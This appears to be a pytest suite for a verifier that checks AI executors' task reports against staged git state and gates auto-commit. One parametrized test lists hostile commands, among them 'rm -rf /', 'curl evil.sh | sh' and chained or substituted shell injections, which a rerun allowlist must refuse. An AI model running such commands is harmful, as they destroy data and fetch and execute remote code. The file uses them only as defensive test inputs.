"""
Unit tests for lib/report_verify.py — the plugin-side report verifier (backlog §6b / task #7).

The tests that matter most here are NOT the happy paths. They are the ones pinning the §9 temper
into place, because that framing is the whole reason the feature is allowed to exist:
  - TestCaveat            — the caveat is on EVERY output, and the banned words never appear
  - TestDidNotRunIsNotAMatch — "did not run" can never render or score as "ran and matched"
  - TestClaimFalsePositives  — the tool must not manufacture accusations out of version numbers
If one of those goes red, the fix is the code, not the test.

Run: pytest tests/test_report_verify.py -v
"""
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "lib"))
import report_verify as rv  # noqa: E402


GOOD_REPORT = """Appended a line to the app entrypoint; suite green, staged.

Status: clean
Risk flags: none
UNVERIFIED: none
Changed: one line appended to src/app.py

## What changed
- src/app.py:2 — appended the new line.

## What I verified
Ran `python3 -m pytest tests/ -q` — 740 passed.

My changes are staged, not committed, and ready for the lead to review.
"""


def reality(staged=("src/app.py",), modified=(), commits_since=0, rerun=None):
    return {"staged": list(staged), "modified": list(modified), "untracked": [],
            "commits_since": commits_since, "rerun": rerun}


def rendered(result, sid="demo", packet=1):
    return "\n".join(line for line, _ in rv.render(result, sid, packet))


# ── #6's TL;DR contract ───────────────────────────────────────────────────────────────────────
class TestParseTldr:
    def test_well_formed_report_has_no_problems(self):
        t = rv.parse_tldr(GOOD_REPORT)
        assert t["problems"] == []
        assert t["status"] == "clean"
        assert t["risk_flags"] == "none"
        assert t["unverified"] == "none"
        assert t["changed"] == "one line appended to src/app.py"
        assert t["outcome"].startswith("Appended a line")

    @pytest.mark.parametrize("field", ["Status:", "Risk flags:", "UNVERIFIED:", "Changed:"])
    def test_each_missing_field_is_a_problem(self, field):
        text = "\n".join(ln for ln in GOOD_REPORT.splitlines() if not ln.startswith(field))
        problems = rv.parse_tldr(text)["problems"]
        assert any(field in p for p in problems), problems

    def test_missing_unverified_line_is_malformed_not_none(self):
        """#6's contract, the single most load-bearing assertion in this file: an ABSENT
        UNVERIFIED line must read as malformed, never as 'nothing to report'."""
        text = GOOD_REPORT.replace("UNVERIFIED: none\n", "")
        result = rv.verify(text, reality())
        assert result["verdict"] == rv.MALFORMED
        assert result["tldr"]["unverified"] is None
        out = rendered(result)
        assert "MALFORMED" in out
        assert "line missing" in out

    def test_empty_field_value_is_a_problem(self):
        text = GOOD_REPORT.replace("UNVERIFIED: none", "UNVERIFIED:")
        assert any("empty" in p for p in rv.parse_tldr(text)["problems"])

    def test_out_of_order_fields_are_a_problem(self):
        text = GOOD_REPORT.replace(
            "Status: clean\nRisk flags: none\nUNVERIFIED: none\n",
            "Risk flags: none\nStatus: clean\nUNVERIFIED: none\n")
        assert any("order" in p for p in rv.parse_tldr(text)["problems"])

    def test_unknown_status_value_is_a_problem(self):
        text = GOOD_REPORT.replace("Status: clean", "Status: mostly fine")
        assert any("not one of" in p for p in rv.parse_tldr(text)["problems"])

    def test_heading_first_line_is_a_problem(self):
        text = "# Report\n\n" + GOOD_REPORT
        assert any("heading" in p for p in rv.parse_tldr(text)["problems"])

    def test_label_prefixed_first_line_is_a_problem(self):
        text = "Report: did the thing.\n\n" + GOOD_REPORT.split("\n", 1)[1]
        assert any("label prefix" in p for p in rv.parse_tldr(text)["problems"])

    def test_bulleted_tldr_still_parses(self):
        """Executors bullet the block sometimes; that's ornament, not a contract violation."""
        text = GOOD_REPORT.replace("Status: clean", "- Status: clean") \
                          .replace("Risk flags: none", "- Risk flags: none") \
                          .replace("UNVERIFIED: none", "- UNVERIFIED: none") \
                          .replace("Changed: one", "- Changed: one")
        assert rv.parse_tldr(text)["problems"] == []

    def test_empty_report(self):
        assert "empty" in " ".join(rv.parse_tldr("")["problems"])


class TestIsNoneValue:
    @pytest.mark.parametrize("v", ["none", "None", " none ", "none."])
    def test_recognises_none(self, v):
        assert rv.is_none_value(v)

    @pytest.mark.parametrize("v", ["", None, "none of the tests were run", "two flags"])
    def test_rejects_everything_else(self, v):
        assert not rv.is_none_value(v)


# ── claimed files ─────────────────────────────────────────────────────────────────────────────
class TestClaimedPaths:
    def test_scoped_to_what_changed_section(self):
        text = ("intro mentioning docs/spec.md\n\n## What changed\n- bin/relay:10 — thing\n\n"
                "## Next\n- lib/other.py\n")
        paths, scoped = rv.claimed_paths(text)
        assert scoped is True
        assert paths == ["bin/relay"]

    def test_falls_back_to_whole_report_unscoped(self):
        paths, scoped = rv.claimed_paths("I edited bin/relay today.\n")
        assert scoped is False
        assert "bin/relay" in paths

    def test_bold_lead_in_naming_a_file_does_not_end_the_section(self):
        """Regression, found by running this tool on its own report: a bold lead-in that names a
        file is section CONTENT. Treating it as a heading truncated the section to nothing, so
        zero claims were checked and the run still reported COUNTS-MATCH."""
        text = ("## What changed\n\n"
                "**`lib/report_verify.py` (new, 477 lines) — the pure verdict engine.**\n"
                "- lib/report_verify.py:58 — the caveat.\n\n"
                "**`bin/relay` — CLI seam only.**\n"
                "- bin/relay:2361 — cmd_verify.\n\n"
                "## What I verified\n- docs/spec.md was consulted\n")
        paths, scoped = rv.claimed_paths(text)
        assert scoped is True
        assert "lib/report_verify.py" in paths and "bin/relay" in paths
        assert "docs/spec.md" not in paths  # the next real heading still ends the section

    def test_plain_bold_heading_still_ends_the_section(self):
        text = ("## What changed\n- bin/relay:1 — thing.\n\n"
                "**What I verified**\n- lib/other.py was read\n")
        paths, _ = rv.claimed_paths(text)
        assert paths == ["bin/relay"]

    def test_empty_section_degrades_to_unscoped_not_to_zero_claims(self):
        """An empty section yields zero claims, and zero claims would silently read as 'everything
        claimed was staged'. Degrade LOUD (unscoped/advisory), never to agreement."""
        text = "## What changed\n\n## Next\n- src/app.py\n"
        paths, scoped = rv.claimed_paths(text)
        assert scoped is False
        assert "src/app.py" in paths


class TestClaimFalsePositives:
    """The strictness that keeps this tool from manufacturing accusations. diff_render's mention
    regex is permissive on purpose (it intersects with staged files afterwards); here a false
    positive becomes a MISMATCH against an executor who did nothing wrong."""

    @pytest.mark.parametrize("blob", ["bumped 0.3.27 to 0.3.28", "v1.2.3 shipped", "took 165.97s"])
    def test_version_numbers_are_not_paths(self, blob):
        paths, _ = rv.claimed_paths(f"## What changed\n- {blob}\n")
        assert paths == [], paths

    def test_absolute_paths_are_not_claimed_as_repo_paths(self):
        paths, _ = rv.claimed_paths("## What changed\n- wrote /Users/x/.relay-tasks/a/001-report.md\n")
        assert not any(p.startswith("/") for p in paths)

    @pytest.mark.parametrize("prose,ghost", [
        ("tolerates bulleted/ornamented blocks", "bulleted/ornamented"),
        ("reuses diff_render.parse_report_mentions here", "diff_render.parse_report_mentions"),
    ])
    def test_technical_prose_does_not_become_a_claim(self, prose, ghost):
        """Both found by running this tool on its own report. A false MISMATCH is the expensive
        error — it costs trust an executor has not actually spent."""
        paths, _ = rv.claimed_paths(f"## What changed\n- {prose}\n")
        assert ghost not in rv.plausible_claims(paths, repo_entries={"bin", "lib"}, staged=[])

    def test_extensionless_repo_path_stays_checkable(self):
        paths, _ = rv.claimed_paths("## What changed\n- bin/relay:10 — thing\n")
        assert rv.plausible_claims(paths, repo_entries={"bin", "lib"}, staged=[]) == ["bin/relay"]

    def test_without_repo_entries_only_extension_paths_survive(self):
        """Worktree gone → keep only the non-accusing direction."""
        kept = rv.plausible_claims(["bin/relay", "lib/x.py"], repo_entries=(), staged=[])
        assert kept == ["lib/x.py"]

    def test_a_staged_path_is_never_filtered_out(self):
        kept = rv.plausible_claims(["bin/relay"], repo_entries=(), staged=["bin/relay"])
        assert kept == ["bin/relay"]

    def test_real_paths_still_recognised(self):
        paths, _ = rv.claimed_paths("## What changed\n- lib/report_verify.py:5, README.md, bin/relay\n")
        assert paths == ["lib/report_verify.py", "README.md", "bin/relay"]


# ── staged reality ────────────────────────────────────────────────────────────────────────────
class TestStagedReality:
    def test_truthful_report_counts_match(self):
        result = rv.verify(GOOD_REPORT, reality())
        assert result["verdict"] == rv.COUNTS_MATCH
        assert result["claimed_missing"] == []

    def test_claimed_but_never_staged_is_a_mismatch_naming_the_file(self):
        text = GOOD_REPORT.replace("- src/app.py:2 — appended the new line.",
                                   "- src/app.py:2 — appended the new line.\n- docs/notes.md — rewrote it.")
        result = rv.verify(text, reality())
        assert result["verdict"] == rv.MISMATCH
        assert "docs/notes.md" in rendered(result)

    def test_modified_but_unstaged_says_so_specifically(self):
        text = GOOD_REPORT.replace("- src/app.py:2", "- docs/notes.md:1 — rewrote it.\n- src/app.py:2")
        result = rv.verify(text, reality(modified=["docs/notes.md"]))
        assert result["verdict"] == rv.MISMATCH
        assert "but NOT staged" in rendered(result)

    def test_unscoped_claim_is_advisory_not_a_mismatch(self):
        """With no 'What changed' section the tool cannot tell 'I changed x' from 'I read x', so
        it must not accuse. A missed catch is cheaper than a false one."""
        text = ("Did the thing.\n\nStatus: clean\nRisk flags: none\nUNVERIFIED: none\n"
                "Changed: stuff\n\nI consulted docs/spec.md and edited src/app.py, staged not committed.\n")
        result = rv.verify(text, reality())
        assert result["claims_scoped"] is False
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "claimed-not-staged-unscoped" for f in result["findings"])

    def test_staged_but_unclaimed_is_only_a_note(self):
        result = rv.verify(GOOD_REPORT, reality(staged=["src/app.py", "extra.py"]))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "staged-not-claimed" and f["level"] == "note"
                   for f in result["findings"])

    def test_staged_confirmation_over_an_empty_index_is_a_mismatch(self):
        result = rv.verify(GOOD_REPORT, reality(staged=[]))
        assert result["verdict"] == rv.MISMATCH
        assert "EMPTY" in rendered(result)

    def test_empty_index_with_no_claims_is_only_a_note(self):
        text = ("Blocked before touching anything.\n\nStatus: blocked\nRisk flags: none\n"
                "UNVERIFIED: none\nChanged: nothing\n\n## What changed\nNothing.\n")
        result = rv.verify(text, reality(staged=[]))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "index-empty" and f["level"] == "note" for f in result["findings"])

    def test_missing_staged_confirmation_line_is_a_note(self):
        text = GOOD_REPORT.replace("My changes are staged, not committed, and ready for the lead "
                                   "to review.\n", "")
        result = rv.verify(text, reality())
        assert any(f["code"] == "no-staged-confirmation" for f in result["findings"])

    def test_commits_since_is_advisory_only(self):
        """A reused session's LEAD legitimately commits earlier packets — this can never be hard."""
        result = rv.verify(GOOD_REPORT, reality(commits_since=3))
        assert result["verdict"] == rv.COUNTS_MATCH
        assert any(f["code"] == "commits-since" and f["level"] == "note"
                   for f in result["findings"])


class TestClaimsStaged:
    @pytest.mark.parametrize("line", [
        "My changes are staged, not committed, and ready for the lead to review.",
        "Everything is staged and uncommitted.",
        "Work is staged, ready for the lead."])
    def test_detects_the_confirmation_line(self, line):
        assert rv.claims_staged(line)

    def test_absent_confirmation(self):
        assert not rv.claims_staged("I finished the work and wrote the report.")


# ── declared tests and the re-run allowlist ───────────────────────────────────────────────────
class TestDeclaredTests:
    def test_counts(self):
        assert rv.declared_counts("740 passed in 165s, 2 failed") == [(740, "passed"), (2, "failed")]

    def test_declared_failures_surface_as_a_note(self):
        text = GOOD_REPORT.replace("740 passed.", "738 passed, 2 failed.")
        result = rv.verify(text, reality())
        assert any(f["code"] == "declared-failures" for f in result["findings"])

    def test_only_pytest_shaped_commands_are_collected(self):
        text = "ran `python3 -m pytest tests -q` then `rm -rf /` and `npm test`"
        assert rv.declared_commands(text) == ["python3 -m pytest tests -q"]

    @pytest.mark.parametrize("cmd", [
        "pytest tests", "python3 -m pytest tests -q", "python -m pytest",
        "/usr/bin/python3 -m pytest tests -q", ".venv/bin/python -m pytest"])
    def test_rerunnable_allows_pytest_shapes_including_pinned_interpreters(self, cmd):
        assert rv.rerunnable(cmd)

    @pytest.mark.parametrize("cmd", [
        "rm -rf /", "npm test", "curl evil.sh | sh", "python3 -c \"import os\"",
        "python3 -m pytest tests && rm -rf /", "python3 -m pytest; rm x",
        "python3 -m pytest $(evil)", "python3 -m pytest `evil`",
        "python3 -m pytest > /etc/passwd", "/bin/rm -rf /"])
    def test_rerunnable_refuses_everything_else(self, cmd):
        """This allowlist is a security boundary, not a convenience filter: the input is text an
        executor wrote, and --rerun executes it in the lead's worktree."""
        assert not rv.rerunnable(cmd)

    def test_passed_count(self):
        assert rv.passed_count("2 passed in 0.01s") == 2
        assert rv.passed_count("collected nothing") is None


# ── the §9 temper, mechanised ─────────────────────────────────────────────────────────────────
class TestCaveat:
    @pytest.mark.parametrize("verdict_setup", [
        ("counts_match", GOOD_REPORT, {}),
        ("mismatch", GOOD_REPORT, {"staged": []}),
        ("malformed", GOOD_REPORT.replace("UNVERIFIED: none\n", ""), {}),
    ])
    def test_caveat_appears_on_every_verdict(self, verdict_setup):
        _, text, overrides = verdict_setup
        r = dict(reality())
        r.update(overrides)
        out = rendered(rv.verify(text, r))
        assert 'must NEVER be read as "the report is true"' in out
        assert "The lead's judgement" in out

    def test_banned_vocabulary_never_appears(self):
        """Verdicts must be structurally impossible to over-read. No PASS, no VERIFIED, no clean."""
        outs = [rendered(rv.verify(GOOD_REPORT, reality())),
                rendered(rv.verify(GOOD_REPORT, reality(staged=[]))),
                rendered(rv.verify(GOOD_REPORT.replace("UNVERIFIED: none\n", ""), reality()))]
        for out in outs:
            verdict_line = next(ln for ln in out.splitlines() if "VERDICT:" in ln)
            for banned in ("PASS", "VERIFIED", "OK", "GREEN"):
                assert banned not in verdict_line, verdict_line
        assert set(rv.EXIT_CODES) == {rv.COUNTS_MATCH, rv.MISMATCH, rv.MALFORMED, rv.INCONCLUSIVE}

    def test_counts_match_output_says_it_is_a_ceiling(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "ceiling of what this tool can say" in out

    def test_premise_level_wrongness_is_named_as_invisible(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "wrong venv" in out and "INVISIBLE" in out


class TestRiskEcho:
    def test_risk_flags_and_unverified_are_echoed_verbatim(self):
        text = GOOD_REPORT.replace("Risk flags: none", "Risk flags: weakened a parity assertion") \
                          .replace("UNVERIFIED: none", "UNVERIFIED: assumed the CI venv matches")
        out = rendered(rv.verify(text, reality()))
        assert "weakened a parity assertion" in out
        assert "assumed the CI venv matches" in out
        assert "NOT assessed here" in out

    def test_risk_flags_do_not_change_the_verdict(self):
        """The verifier SURFACES risk, it never absorbs or grades it — that stays lead judgement."""
        text = GOOD_REPORT.replace("Risk flags: none", "Risk flags: touches core ledger logic")
        assert rv.verify(text, reality())["verdict"] == rv.COUNTS_MATCH

    def test_none_is_echoed_as_the_reports_own_claim(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()))
        assert "echoed, not confirmed" in out


class TestDidNotRunIsNotAMatch:
    """§9.6a, mechanised: 'did not run' must never look — or score — like 'ran and matched'."""

    def test_default_run_renders_not_re_run_and_stays_counts_match(self):
        result = rv.verify(GOOD_REPORT, reality())
        assert result["verdict"] == rv.COUNTS_MATCH
        assert "NOT RE-RUN" in rendered(result)

    def test_rerun_with_no_parsable_count_is_inconclusive_not_counts_match(self):
        """The live failure that created this verdict: pytest resolved to an interpreter that had
        no pytest, so the 'run' produced nothing — which must not read as agreement."""
        r = reality(rerun=[{"cmd": "python3 -m pytest tests -q", "passed": None, "declared": 740}])
        result = rv.verify(GOOD_REPORT, r)
        assert result["verdict"] == rv.INCONCLUSIVE
        out = rendered(result)
        assert "did not run" in out
        assert "nothing was compared" in out.lower()

    def test_rerun_requested_but_nothing_runnable_is_inconclusive(self):
        result = rv.verify(GOOD_REPORT, reality(rerun=[]))
        assert result["verdict"] == rv.INCONCLUSIVE
        assert "did NOT happen" in rendered(result)

    def test_rerun_with_nothing_declared_to_compare_is_inconclusive(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 12, "declared": None}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.INCONCLUSIVE

    def test_rerun_counts_differ_is_a_mismatch(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 2, "declared": 3}])
        result = rv.verify(GOOD_REPORT, r)
        assert result["verdict"] == rv.MISMATCH
        assert "2 passed, but the report declares 3" in rendered(result)

    def test_rerun_counts_agree_is_counts_match(self):
        r = reality(rerun=[{"cmd": "pytest", "passed": 740, "declared": 740}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.COUNTS_MATCH


class TestVerdictPrecedence:
    def test_malformed_outranks_mismatch(self):
        text = GOOD_REPORT.replace("UNVERIFIED: none\n", "")
        assert rv.verify(text, reality(staged=[]))["verdict"] == rv.MALFORMED

    def test_mismatch_outranks_inconclusive(self):
        r = reality(staged=[], rerun=[{"cmd": "pytest", "passed": None, "declared": 1}])
        assert rv.verify(GOOD_REPORT, r)["verdict"] == rv.MISMATCH

    def test_exit_codes_are_distinct_and_only_counts_match_is_zero(self):
        assert rv.EXIT_CODES[rv.COUNTS_MATCH] == 0
        assert len(set(rv.EXIT_CODES.values())) == len(rv.EXIT_CODES)
        assert all(v != 0 for k, v in rv.EXIT_CODES.items() if k != rv.COUNTS_MATCH)

    def test_precedence_list_covers_every_verdict(self):
        assert set(rv.VERDICT_PRECEDENCE) == set(rv.EXIT_CODES)


class TestRenderShape:
    def test_render_returns_text_and_style_pairs(self):
        for line, styles in rv.render(rv.verify(GOOD_REPORT, reality()), "demo", 1):
            assert isinstance(line, str)
            assert isinstance(styles, tuple)

    def test_header_names_session_and_packet(self):
        out = rendered(rv.verify(GOOD_REPORT, reality()), sid="rl-verify", packet=7)
        assert "rl-verify" in out and "packet 007" in out


# ── auto-commit clearance (#16 phase 2) ───────────────────────────────────────────────────────
def cleared_lines(clr):
    return "\n".join(line for line, _ in rv.render_clearance(clr))


def clr_for(report=GOOD_REPORT, staged=("src/app.py",), staged_diff="", **attest):
    attest.setdefault("in_plan", True)
    attest.setdefault("diff_reviewed", True)
    return rv.clearance(rv.verify(report, reality(staged=staged)), staged_diff, **attest)


class TestClearanceConditions:
    """The gate that lets an autonomous lead commit without asking. All five must hold; the
    headline names the FIRST failure in numeric order so the announce can cite one condition."""

    def test_all_five_holding_clears(self):
        clr = clr_for()
        assert clr["cleared"] is True
        assert clr["reason"] is None
        assert "AUTO-COMMIT: CLEARED" in cleared_lines(clr)

    @pytest.mark.parametrize("staged,expected_verdict", [
        (["other.py"], rv.MISMATCH),  # report claims src/app.py, nothing staged matches
    ])
    def test_condition_1_non_counts_match_verdict_stops(self, staged, expected_verdict):
        clr = clr_for(staged=staged)
        assert clr["cleared"] is False
        assert clr["reason"] == f"verdict-is-{expected_verdict}"

    def test_condition_1_malformed_stops(self):
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none\n", ""))
        assert clr["reason"] == "verdict-is-MALFORMED"

    def test_condition_2_clean_with_caveats_stops(self):
        """Named explicitly in the doctrine: the caveats are the point."""
        clr = clr_for(report=GOOD_REPORT.replace("Status: clean", "Status: clean-with-caveats"))
        assert clr["cleared"] is False
        assert clr["reason"] == "status-not-clean"

    def test_condition_2_risk_flags_stop(self):
        clr = clr_for(report=GOOD_REPORT.replace("Risk flags: none",
                                                 "Risk flags: weakened a parity assertion"))
        assert clr["reason"] == "risk-flags-present"

    def test_condition_2_unverified_claims_stop(self):
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none",
                                                 "UNVERIFIED: assumed the CI venv matches"))
        assert clr["reason"] == "unverified-claims-present"

    def test_condition_3_requires_the_in_plan_attestation(self):
        clr = clr_for(in_plan=False)
        assert clr["cleared"] is False
        assert clr["reason"] == "not-attested-in-plan"

    def test_condition_5_requires_the_diff_reviewed_attestation(self):
        clr = clr_for(diff_reviewed=False)
        assert clr["cleared"] is False
        assert clr["reason"] == "not-attested-diff-reviewed"

    def test_a_bare_call_can_never_clear(self):
        """The safety property: attestations default off, so nothing that forgets to assert them
        can be read as clearance."""
        clr = rv.clearance(rv.verify(GOOD_REPORT, reality()), "")
        assert clr["cleared"] is False

    def test_attestations_are_marked_as_uncheckable_in_the_output(self):
        out = cleared_lines(clr_for())
        assert out.count("[lead's attestation — this tool cannot check it]") == 2

    def test_cleared_output_says_it_clears_automation_not_correctness(self):
        out = cleared_lines(clr_for())
        assert "clears the AUTOMATION only" in out
        assert "not a statement that the work is correct" in out

    def test_not_cleared_output_says_fall_back_to_asking(self):
        out = cleared_lines(clr_for(in_plan=False))
        assert "NOT-CLEARED-BECAUSE-not-attested-in-plan" in out
        assert "stop and ask" in out

    def test_first_failure_in_numeric_order_is_the_headline(self):
        """Verdict (1) outranks the attestations (3, 5) so the lead is pointed at the earliest
        problem rather than the last one evaluated."""
        clr = clr_for(report=GOOD_REPORT.replace("UNVERIFIED: none\n", ""), in_plan=False,
                      diff_reviewed=False)
        assert clr["reason"] == "verdict-is-MALFORMED"

    def test_every_condition_is_reported_even_when_one_fails(self):
        clr = clr_for(in_plan=False)
        assert [c["n"] for c in clr["conditions"]] == [1, 2, 3, 4, 5]


class TestSignoffGating:
    """Condition 4. Blunt substring matching on purpose: a false 'sign-off needed' costs one
    question, a false clearance costs trust."""

    @pytest.mark.parametrize("path", [
        "hooks/stop_lead_watch.py", "lib/lead_guard.py", "db/migrations/001.sql",
        "tests/test_parity.py", "tests/golden/out.json", "schema/user.sql", "deploy/run.sh"])
    def test_signoff_gated_paths_stop_clearance(self, path):
        report = GOOD_REPORT.replace("- src/app.py:2 — appended the new line.",
                                     f"- {path}:1 — changed it.")
        clr = clr_for(report=report, staged=[path])
        assert clr["cleared"] is False
        assert clr["reason"] == "signoff-gated-path-touched"
        assert path in cleared_lines(clr)

    def test_ordinary_paths_do_not_trip_it(self):
        assert rv.signoff_hits(["src/app.py", "README.md"]) == []

    def test_ledger_format_edits_stop_clearance(self):
        """A ledger change is a shape of edit, not a path — detected in the staged diff."""
        clr = clr_for(staged_diff="+    append_ledger(\"auto_commit\", session_id=x)\n")
        assert clr["cleared"] is False
        assert clr["reason"] == "signoff-gated-path-touched"
        assert "ledger format" in cleared_lines(clr)

    def test_an_unrelated_diff_does_not_trip_the_ledger_check(self):
        assert rv.signoff_hits(["src/app.py"], "+    print('hello')\n") == []

    def test_signoff_hit_reports_a_reason_per_path(self):
        hits = rv.signoff_hits(["hooks/x.py"])
        assert len(hits) == 1 and "wake/gate" in hits[0][1]
